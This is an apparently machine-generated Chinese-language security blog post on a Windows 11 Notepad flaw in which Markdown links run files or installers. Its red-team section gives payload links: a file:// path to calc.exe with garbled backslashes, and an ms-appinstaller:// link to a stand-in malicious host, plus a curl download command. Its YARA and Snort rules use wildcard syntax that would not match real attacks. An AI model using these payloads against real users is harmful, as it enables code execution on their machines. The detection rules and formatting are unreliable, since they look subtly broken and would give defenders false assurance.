---
layout: post
title:  "Windows 11 Notepad flaw let files execute silently via Markdown links"
date:   2026-02-12 01:29:55 +0000
categories: [security]
severity: high
---

# 🔥 解析 Windows 11 Notepad 遠端代碼執行漏洞

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Markdown, Command Injection, URI Handling

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Notepad 在處理 Markdown 文件中的連結時，沒有正確地中和特殊元素，導致攻擊者可以注入命令，從而實現遠端代碼執行。
* **攻擊流程圖解**:
  1. 攻擊者創建一個 Markdown 文件，包含惡意連結（例如：`file://` 或 `ms-appinstaller://`）。
  2. 用戶在 Windows 11 Notepad 中打開該 Markdown 文件。
  3. Notepad 渲染 Markdown 文件，顯示連結。
  4. 用戶點擊連結，Notepad 將啟動未經驗證的協議，載入和執行遠端文件。
* **受影響元件**: Windows 11 Notepad 版本 11.2510 及更早版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建一個 Markdown 文件，並將其傳遞給受害者。
* **Payload 建構邏輯**:

    ```
    
    markdown
      [Link to Malicious File](file://\\\\\\\\\\\\C:\\\\Windows\\\\System32\\\\calc.exe)
    
    ```
  或

```

markdown
  [Link to Malicious File](ms-appinstaller://example.com/malicious.appinstaller)

```
* **範例指令**:

    ```
    
    bash
      curl -X GET "https://example.com/malicious.md" -o malicious.md
    
    ```
* **繞過技術**: 攻擊者可以使用社交工程技術，例如發送電子郵件或消息，誘騙用戶點擊連結。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | C:\Windows\System32\calc.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Notepad_RCE {
        meta:
          description = "Detects Notepad RCE vulnerability"
          author = "Your Name"
        strings:
          $markdown_link = "[Link to *](file://*)"
        condition:
          $markdown_link
      }
    
    ```
  或

```

snort
  alert tcp any any -> any 80 (msg:"Notepad RCE vulnerability"; content:"[Link to *](file://*)"; sid:1000001; rev:1;)

```
* **緩解措施**: 更新 Notepad 至最新版本，或者設定 Notepad 將連結以安全的協議（例如 `http://` 或 `https://`）開啟。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Markdown**: 一種輕量級標記語言，使用簡單的符號來格式化文本。
* **Command Injection**: 一種攻擊技術，攻擊者注入惡意命令，從而實現未經授權的操作。
* **URI Handling**: URI（統一資源標識符）處理，指的是應用程序如何處理和解析 URI。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/microsoft/windows-11-notepad-flaw-let-files-execute-silently-via-markdown-links/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


